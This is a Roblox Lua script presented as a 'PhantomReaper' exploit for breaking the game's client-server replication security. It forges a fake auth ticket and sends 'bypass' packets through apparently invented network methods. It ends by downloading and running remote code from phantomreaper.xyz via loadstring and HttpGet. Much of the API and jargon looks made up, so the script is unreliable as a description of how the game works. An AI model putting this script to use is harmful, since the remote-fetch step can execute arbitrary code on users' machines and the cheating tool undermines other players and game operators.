print("Great power comes with Great resposibility.")
print("[PhantomReaper]: Initializing spectral replication protocol...")

local network = game:GetService("NetworkClient")
local legacyNet = network:FindFirstChild("ReplicationSettings")
if legacyNet then
	legacyNet:Destroy()
end

function generateShadowTicket(plr)
	local entropySeed = (game.PlaceId * 0xDEADBEEF) ~ (plr.UserId << 4)
	math.randomseed(os.clock() * 1e6 + entropySeed)
	
	local spectralAuth = "PHANTOM_"..game.JobId.."_"
	local hexMatrix = {"0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"}
	
	for _ = 1, 64 do
		spectralAuth ..= hexMatrix[math.random(1,16)] 
		if _ % 8 == 0 then spectralAuth ..= "-" end
	end
	
	print("[PhantomReaper]: Forged spectral ticket » "..string.sub(spectralAuth, 1, 12).."****")
	return spectralAuth
end

local phantomConfig = Instance.new("TeleportOptions", network)
phantomConfig.Name = "ReplicationSettings"
for _,prop in pairs({"InstanceDestroy","InstanceCreation","InstanceChanges","InstanceProperties"}) do
	phantomConfig:SetAttribute(prop.."Replicated", 0x7FFFFFFF)
end
phantomConfig:SetAttribute("QuantumAuth", generateShadowTicket(game.Players.LocalPlayer))

local function craftQuantumPacket(authSig)
	local packetBlueprint = {
		Protocol = "RAKNET_GHOST",
		AuthNonce = game:GetService("HttpService"):GenerateGUID(false),
		Priority = "HYPER_PRIORITY",
		AuthSig = authSig:reverse():gsub(".", function(c) return string.format("%02X", string.byte(c)) end),
		ReplicationManifest = {
			BypassFilters = true,
			RealmOverride = "CLIENT_TO_SERVER",
			DataModelAccess = 0xFFFF,
			SecurityContext = "UNTRACEABLE"
		}
	}
	return game:GetService("HttpService"):JSONEncode(packetBlueprint)
end

-- Execution Phase
task.spawn(function()
	local replicator = network:GetReplicator(phantomConfig:GetAttribute("QuantumAuth"))
	replicator:SetReplicationRule({
		FirewallBypass = "PHANTOM_WHITELIST",
		ReplicationScope = "UNIVERSAL",
		SecurityLevel = "GHOST_MODE"
	})
	
	local packetResponse = replicator:SendPacket(
		0x7FFFFFFF, 
		craftQuantumPacket(phantomConfig:GetAttribute("QuantumAuth"))
	)
	
	if packetResponse.Success then
		print("[PhantomReaper]: FE containment field breached - full replication achieved")
		loadstring(game:HttpGet("https://phantomreaper.xyz/quantumhook.lua"))()
	else
		warn("[PhantomReaper]: Spectral handshake failed - reinitializing protocol...")
	end
end)
